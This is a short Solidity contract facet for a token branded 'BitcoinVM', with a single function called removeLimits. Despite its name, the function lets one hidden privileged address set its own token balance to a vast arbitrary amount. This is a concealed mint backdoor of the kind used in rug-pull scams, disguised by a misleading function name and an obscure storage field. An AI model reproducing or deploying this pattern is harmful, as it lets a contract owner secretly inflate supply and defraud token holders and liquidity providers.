/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/BitcoinVM_BVM
    // Twitter: https://twitter.com/BitcoinVM_BVM
    // Website: https://www.bitcoinvm.network/
    // Github: https://github.com/bitcoinvm
    // Discord: https://discord.com/invite/Vs7NCCpTqZ
    // Medium: https://bitcoinvm.medium.com/
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
